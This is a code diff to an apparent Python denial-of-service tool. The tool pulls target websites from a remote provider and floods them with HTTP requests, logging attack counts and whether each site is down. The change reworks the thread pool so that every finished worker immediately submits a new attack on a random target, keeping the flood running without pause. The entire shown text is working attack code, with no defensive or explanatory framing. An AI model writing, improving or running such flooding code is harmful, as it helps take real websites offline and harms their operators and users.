@@ -40,6 +40,7 @@ proxy_view = args.proxy_view
 
 remoteProvider = RemoteProvider(args.targets)
 threads = int(args.threads)
+executor = ThreadPoolExecutor(max_workers=threads)
 
 logger.remove()
 logger.add(
@@ -69,8 +70,6 @@ def mainth(site: str):
          'Connection': 'keep-alive',
          'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
          'Accept-Encoding': 'gzip, deflate, br'})
-
-    logger.info("GET RESOURCES FOR ATTACK")
 
     logger.info("STARTING ATTACK TO " + site)
 
@@ -105,13 +104,16 @@ def mainth(site: str):
                 logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
         if attacks_number > 0:
             logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
+        # when thread finishes, add new task to executor
+        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
     except ConnectionError as exc:
         logger.success(f"{site} is down")
-        return result, site
+        # when thread finishes, add new task to executor
+        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
     except Exception as exc:
         logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
-        return result, site
-
+        # when thread finishes, add new task to executor
+        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
 
 def clear():
     if platform.system() == "Linux":
@@ -135,10 +137,6 @@ if __name__ == '__main__':
     check_req()
     Thread(target=cleaner, daemon=True).start()
     sites = remoteProvider.get_target_sites()
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        while True:
-            future_tasks = [executor.submit(mainth, choice(sites)) for _ in range(threads)]
-            for task in as_completed(future_tasks):
-                status, site = task.result()
-                logger.info(f"{status.upper()}: {site}")
-                executor.submit(mainth, choice(remoteProvider.get_target_sites()))
+    # initially start as many tasks as configured threads
+    for _ in range(threads):
+        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
